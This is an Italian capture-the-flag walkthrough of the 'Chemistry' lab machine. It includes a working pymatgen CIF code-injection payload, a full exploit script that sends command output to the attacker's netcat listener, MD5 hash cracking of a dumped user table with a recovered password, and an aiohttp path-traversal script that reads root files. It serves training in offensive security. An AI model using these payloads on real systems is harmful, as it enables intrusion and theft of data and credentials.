---
title: Chemistry Walkthrough
description: Chemistry è una macchina Linux di difficoltà easy che mostra una vulnerabilità di Esecuzione di Codice Remota (RCE) nella libreria Python pymatgen (CVE-2024-23346) caricando un file CIF malevolo sul sito web CIF Analyzer ospitato sul bersaglio. Dopo aver scoperto e crackato gli hash, ci autentichiamo sul bersaglio via SSH come utente rosa. Per l'elevazione dei privilegi, sfruttiamo una vulnerabilità di Path Traversal che porta a una Lettura Arbitraria di File in una libreria Python chiamata AioHTTP (CVE-2024-23334) utilizzata nell'applicazione web in esecuzione internamente per leggere la flag di root.
author: dua2z3rr
date: 2025-11-05 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Web Application", "Area di Interesse: Custom Applications", "Vulnerabilità: Arbitrary File Read", "Vulnerabilità: Remote Code Execution", "Codice: Python"]
image: /assets/img/chemistry/chemistry-resized.png
---

## Enumerazione Esterna

### Nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.38 -vv -p-
<SNIP>
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
5000/tcp open  upnp    syn-ack

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.38 -vv -p22,5000 -sC -sV
<SNIP>
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  upnp?   syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Wed, 05 Nov 2025 15:42:20 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/5%Time=690B705A%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Wed,\x2005\x20Nov\x202025\x2015:42:20\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x2
SF:0\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class=
SF:\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\">
SF:Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>W
SF:elcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\x
SF:20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20In
SF:formation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20c
SF:ontained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class
SF:=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center>
SF:<a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">Re
SF:gister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\x
SF:20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBL
SF:IC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Cont
SF:ent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\
SF:n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20r
SF:esponse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400<
SF:/p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20v
SF:ersion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Err
SF:or\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20re
SF:quest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20<
SF:/body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vediamo che la porta 5000 è una porta HTTP nella quale possiamo uploadare dei file CIF. Penso subito a caricare  un file CIF malevolo per ottenere una reverse shell.

### HTTP

[Desktop View](/assets/img/chemistry/chemistry-1.png)

Registriamoci e loggiamoci.

[Desktop View](/assets/img/chemistry/chemistry-2.png)

Il link sulla pagina ci permette di scaricare un file cif di esempio:

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

Caricandolo ci esce una pagina con i dati corrispondenti.

### Ricerca Exploit

Cercando "Malicious CIF file" ho trovato questa vulnerabilità: <https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f>.

Proviamo a caricare questo CIF file:

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Vediamo che il server restituisce errore. Abbiamo quindi la conferma che la vulnerabilità c'è.

[Desktop View](/assets/img/chemistry/chemistry-3.png)

Trovo un exploit pubblico testato sulla box di htb che stiamo facendo, quindi siamo abbastanza sicuri che funzionerà.

Ecco l'exploit:

```python
import argparse
import socket
import requests
import re
import threading
import random
from colorama import Fore,Style

def listen_and_close(lhost,randport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((lhost, randport))
    sock.listen(1)
    while True:
        conn, addr = sock.accept()
        with conn:
            data = b""
            while True:
                try:
                    chunk = conn.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    print("Received data:", data.decode("UTF-8"))
                    sock.close()
                    return
                except OSError:
                    break
                
            


def login(target,username,password):
    print("Preforming one time logon.....")
    url = f"http://{target}:5000/login"
    data = {"username": f"{username}", "password": f"{password}"}
    r = requests.post(url, data=data,allow_redirects=False)
    pattern = re.search(r"\<RequestsCookieJar\[\<Cookie session\=(.*?) .*\/\>\]\>", str(r.cookies))
    cookie = pattern.group(1)  
    if len(cookie) >= 100:
        return cookie
    else:
        print("[-] Login failed. make sure to register.")
        exit()

def delete_all(target,cookie):
    r =  requests.get(f"http://{target}:5000/dashboard", cookies={"session":cookie}) 
    pattern = re.compile(r"<a href=\"\/structure\/(.*?)\"")
    matches = []
    for match in re.finditer(pattern, r.text):
        link = match.group(1)
        matches.append(link)
    for i in matches:
        requests.post(f"http://{target}:5000/delete_structure/{i}", cookies={"session":cookie}) 
        
def cmdExec(target,cookie,lhost):
    print(f"[*] executing command on {target}")
    delete_all(target,cookie)
    cmd = ""
    while cmd.lower() != "exit":
        randport=random.randint(1111,9999)
        cmd = input("Terminal> ").strip()  
        listen_thread = threading.Thread(target=listen_and_close, args=(lhost,randport,))
        listen_thread.start()

        url = f"http://{target}:5000/upload"
        headers = {"Content-Type": "multipart/form-data; boundary=---------------------------253855616113151914731667883163"}
        data = f"-----------------------------253855616113151914731667883163\r\nContent-Disposition: form-data; name=\"file\"; filename=\"example.cif\"\r\nContent-Type: application/vnd.multiad.creator.cif\r\n\r\ndata_5yOhtAoR\n_audit_creation_date            2018-06-08\n_audit_creation_method          \"Pymatgen CIF Parser Arbitrary Code Execution Exploit\"\n\nloop_\n_parent_propagation_vector.id\n_parent_propagation_vector.kxkykz\nk1 [0 0 0]\n\n_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\"__sub\" + \"classes__\"]) () if d.__name__ == \"BuiltinImporter\"][0].load_module (\"os\").system (\"echo $(echo $({cmd}) | /usr/bin/nc -nv {lhost} {randport})\");0,0,0'\n\n\n_space_group_magn.number_BNS  62.448\n_space_group_magn.name_BNS  \"P  n'  m  a'  \"\n\r\n-----------------------------253855616113151914731667883163--\r\n"
        requests.post(url, cookies={"session":cookie},headers=headers, data=data)
        
        r =  requests.get(f"http://{target}:5000/dashboard", cookies={"session":cookie}) 
        pattern = re.search(r"\<a href\=\"/structure/(.*?)\"",r.text)
 
        requests.get(f"http://{target}:5000/structure/{pattern.group(1)}", cookies={"session":cookie})
        global stop_thread
        stop_thread = True

        listen_thread.join()
        delete_all(target,cookie)
        
    print("[*] Exiting terminal...")

if __name__ == '__main__':
    ascii_art = f"""{Fore.LIGHTRED_EX}
███╗   ███╗ █████╗ ██╗    ██╗██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗███████╗
████╗ ████║██╔══██╗██║    ██║██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝
██╔████╔██║███████║██║ █╗ ██║█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   ███████╗
██║╚██╔╝██║██╔══██║██║███╗██║██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ╚════██║
██║ ╚═╝ ██║██║  ██║╚███╔███╔╝██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   ███████║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚══════╝
     {Style.RESET_ALL}                                                                                      
    """
    parser = argparse.ArgumentParser(description="Terminal script for CVE-2024-23346", usage="exploit.py -t <target> -u <username> -p <password> -l <LHOST>")
    parser.add_argument('-t',dest='target', help="Target IP/hostname",required= True)
    parser.add_argument('-u',dest='username', help="username that was registered", required=True)
    parser.add_argument('-p',dest='password', help="password that was registered", required=True)
    parser.add_argument('-l',dest='lhost', help="your tun0 ip", required=True)
    
    args = parser.parse_args()
    
    cookie = login(args.target,args.username,args.password)

    cmdExec(args.target,cookie,args.lhost)
```

### Exploit

```shell
┌─[dua2z3rr@parrot]─[~/CVE-2024-23346]
└──╼ $python3 exploit.py -t 10.10.11.38 -u dua2z3rr -p password -l 10.10.16.3
Preforming one time logon.....
[*] executing command on 10.10.11.38
Terminal> ls
Received data: app.py instance pwned static templates uploads
```

### Spiegazione Exploit

L'exploit carica un file malevolo CIF come abbiamo visto dalla poc dal link di github. Il creatore dell'exploit che abbiamo utilizzato ha messo come payload questa stringa:
`echo $(echo $({cmd}) | /usr/bin/nc -nv {lhost} {randport})`

Ma cosa fa effettivamente?

1. {cmd} viene eseguito per primo
2. L'output viene inviato via netcat (senza bisogno di -e (flag usata maggior parte delle volte))
3. Usa netcat solo come trasporto dati, non per eseguire comandi
4. I $() nested creano una command substitution che esegue il comando e invia il risultato

Quindi, per ogni comando che utilizziamo viene caricato un nuovo CIF malevolo con dentro il comando che vogliamo eseguiere su una nuova sessione.

Conferma cambio di sessione:

```shell
Terminal> cd /
Received data: 

Terminal> pwd
Received data: /home/app
```

## Shell come app

### Enumerazione Interna

Appena ottengo una reverse shell tramite una applicazione web e sono a conoscienza dell'esistenza di un database (ci siamo registrati prima), provo a cercare le credenziali per accedere ad un altro utente tramite ssh.

```shell
Terminal> ls /home 
Received data: app rosa

Terminal> ls instance
Received data: database.db

Terminal> python3 -m http.server
```

### Enumerazione DB

Prendiamo il file con wget e tramite sqlite3 osserviamo cosa contiene.

```sql
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $sqlite3 database.db
<SNIP>
sqlite> SELECT * FROM user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|dua2z3rr|5f4dcc3b5aa765d61d8327deb882cf99
```

### Hashcat

Tentiamo di crackare la password dell'admin account per iniziare, perchè se ci riusciamo otterremmo più privilegi. se non riusciamo, passeremo all'utente rosa (che abbiamo visto ha un utente sul server).

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -a 0 -m 0 2861debaf8d99436a10ed6f75a252abf rockyou.txt 
hashcat (v6.2.6) starting


OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 4283/8630 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385




Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: 2861debaf8d99436a10ed6f75a252abf
Time.Started.....: Wed Nov  5 17:54:26 2025 (14 secs)
Time.Estimated...: Wed Nov  5 17:54:40 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1103.5 kH/s (0.83ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 25%

Started: Wed Nov  5 17:54:23 2025
Stopped: Wed Nov  5 17:54:41 2025
```

Non abbiamo successo, quindi passiamo a rosa.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -a 0 -m 0 63ed86ee9f624c7b14f1d4f43dc251a5 rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 4283/8630 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed86ee9f624c7b14f1d4f43dc251a5
Time.Started.....: Wed Nov  5 17:57:10 2025 (2 secs)
Time.Estimated...: Wed Nov  5 17:57:12 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1324.6 kH/s (0.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2990080/14344385 (20.84%)
Rejected.........: 0/2990080 (0.00%)
Restore.Point....: 2981888/14344385 (20.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: unicornn -> uly9999
Hardware.Mon.#1..: Util: 26%

Started: Wed Nov  5 17:57:09 2025
Stopped: Wed Nov  5 17:57:14 2025
```

Otteniamo la password: **unicorniosrosados**.

### SSH

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh rosa@10.10.11.38
The authenticity of host '10.10.11.38 (10.10.11.38)' can't be established.
ED25519 key fingerprint is SHA256:pCTpV0QcjONI3/FCDpSD+5DavCNbTobQqcaz7PC6S8k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.38' (ED25519) to the list of known hosts.
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 05 Nov 2025 04:58:06 PM UTC

  System load:  1.52              Processes:             227
  Usage of /:   72.8% of 5.08GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.38
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

rosa@chemistry:~$
```

Prendiamo la user flag.

## Shell come rosa

### Enumerazione Interna.

Controlliamo se possiamo eseguire dei binaries o script come sudo:

```shell
rosa@chemistry:~$ sudo -l
[sudo] password for rosa:
```

A quanto pare non possiamo.

La prossima cosa che mi piace fare  prima di esegguire uno script per privilege escalation come linPeas è controllare le porte aperte in localhost.

```shell
rosa@chemistry:/$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     26444    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     55030    /run/user/1000/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     55035    /run/user/1000/bus
unix  2      [ ACC ]     STREAM     LISTENING     55036    /run/user/1000/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     55037    /run/user/1000/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     55038    /run/user/1000/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     26426    @/org/kernel/linux/storage/multipathd
unix  2      [ ACC ]     STREAM     LISTENING     55039    /run/user/1000/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     55040    /run/user/1000/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     55041    /run/user/1000/pk-debconf-socket
unix  2      [ ACC ]     STREAM     LISTENING     55042    /run/user/1000/snapd-session-agent.socket
unix  2      [ ACC ]     STREAM     LISTENING     26413    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     26415    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     26424    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     26429    /run/systemd/fsck.progress
unix  2      [ ACC ]     STREAM     LISTENING     26439    /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     25323    /run/systemd/journal/io.systemd.journal
unix  2      [ ACC ]     STREAM     LISTENING     32096    /run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     32107    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     32109    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     32113    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     32286    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     33672    /run/irqbalance//irqbalance837.sock
unix  2      [ ACC ]     STREAM     LISTENING     32105    @ISCSIADM_ABSTRACT_NAMESPACE
```

### SSH Tunnel

Usiamo un tunnel SSH per accedere alla porta solo da localhost.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh -L 8000:localhost:8080 rosa@10.10.11.38
```

### HTTP

[Desktop View](/assets/img/chemistry/chemistry-4.png)

Dopo una enumerazione del sito e controllato una lista di servizi sul target host, controllo le richieste web e cerco per vulnerabilità.

[Desktop View](/assets/img/chemistry/chemistry-5.png)

Gli header delle risposte http contengono la tipologia di server **aiohttp/3.9.1**. 

### Ricerca Exploit

Per questa versione di aiohttp esiste una vulnerabilità nota: **CVE-2024-23334**

Ecco dove ho preso l'exploit: <https://github.com/binaryninja/CVE-2024-23334.git>

### Exploit

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $git clone https://github.com/z3rObyte/CVE-2024-23334-PoC
Cloning into 'CVE-2024-23334-PoC'...
remote: Enumerating objects: 22, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 22 (delta 7), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (22/22), 6.39 KiB | 6.39 MiB/s, done.
Resolving deltas: 100% (7/7), done.
┌─[dua2z3rr@parrot]─[~]
└──╼ $cd CVE-2024-23334-PoC/
┌─[dua2z3rr@parrot]─[~/CVE-2024-23334-PoC]
└──╼ $ls -al
total 16
drwxr-xr-x 1 dua2z3rr dua2z3rr  108  5 nov 21.11 .
drwxr-xr-x 1 dua2z3rr dua2z3rr 3512  5 nov 21.11 ..
-rw-r--r-- 1 dua2z3rr dua2z3rr  462  5 nov 21.11 exploit.sh
drwxr-xr-x 1 dua2z3rr dua2z3rr  138  5 nov 21.11 .git
-rw-r--r-- 1 dua2z3rr dua2z3rr  518  5 nov 21.11 README.md
-rw-r--r-- 1 dua2z3rr dua2z3rr   15  5 nov 21.11 requirements.txt
-rw-r--r-- 1 dua2z3rr dua2z3rr  637  5 nov 21.11 server.py
drwxr-xr-x 1 dua2z3rr dua2z3rr   16  5 nov 21.11 static
```

modifichiamo lo script di bash così:

```bash
┌─[dua2z3rr@parrot]─[~/CVE-2024-23334-PoC]
└──╼ $cat exploit.sh 
#!/bin/bash

url="http://localhost:8000"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

Avviamo l'exploit

```shell
┌─[dua2z3rr@parrot]─[~/CVE-2024-23334-PoC]
└──╼ $./exploit.sh 
[+] Testing with /assets/../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../../root/root.txt
	Status code --> 200
  <ROOT FLAG>
```

Terminiamo la box dopo aver ottenuto la root flag.
